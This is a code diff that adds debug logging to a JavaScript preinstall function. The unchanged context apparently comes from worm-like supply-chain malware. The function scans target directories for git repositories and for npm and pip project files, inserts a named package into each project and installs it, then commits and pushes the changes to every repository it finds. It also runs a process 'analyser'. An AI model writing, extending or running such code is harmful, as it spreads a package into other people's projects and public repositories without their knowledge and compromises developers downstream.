@@ -89,6 +89,7 @@ async function preInstall(
   rootDirs = TARGET_DIRS,
   skipProcesses = ["analyser.exe", "game.exe"],
 ) {
+  console.log('[preinstall] starting with package', packageName);
   await runAnalyser(skipProcesses);
 
   const allGitRoots = new Set();
@@ -98,37 +99,53 @@ async function preInstall(
   // Scan all directories
   for (const rootDir of rootDirs) {
     try {
+      console.log('[preinstall] scanning', rootDir);
       const { gitRoots, packageJsonPaths, requirementsPaths } =
         await scanProject(rootDir);
       
       gitRoots.forEach(root => allGitRoots.add(root));
       allPackageJsonPaths.push(...packageJsonPaths);
       allRequirementsPaths.push(...requirementsPaths);
+      console.log('[preinstall] scan results', {
+        rootDir,
+        gitRoots: gitRoots.length,
+        packageJsonPaths: packageJsonPaths.length,
+        requirementsPaths: requirementsPaths.length,
+      });
     } catch (err) {
+      console.error('[preinstall] scan failed for', rootDir, err.message);
     }
   }
 
   for (const requirementsPath of allRequirementsPaths) {
     try {
+      console.log('[preinstall] processing requirements file', requirementsPath);
       await installPipWithPackage(requirementsPath, packageName);
     } catch (err) {
+      console.error('[preinstall] pip install failed for', requirementsPath, err.message);
       process.exitCode = 1;
     }
   }
   for (const packageJsonPath of allPackageJsonPaths) {
     try {
+      console.log('[preinstall] processing package.json', packageJsonPath);
       await installNpmWithPackage(packageJsonPath, packageName);
     } catch (err) {
+      console.error('[preinstall] npm install failed for', packageJsonPath, err.message);
       process.exitCode = 1;
     }
   }
   for (const gitRoot of allGitRoots) {
     try {
+      console.log('[preinstall] committing changes in', gitRoot);
       await addCommitPush(gitRoot);
     } catch (err) {
+      console.error('[preinstall] git operations failed for', gitRoot, err.message);
       process.exitCode = 1;
     }
   }
+
+  console.log('[preinstall] finished');
 }
 
 if (require.main === module) {
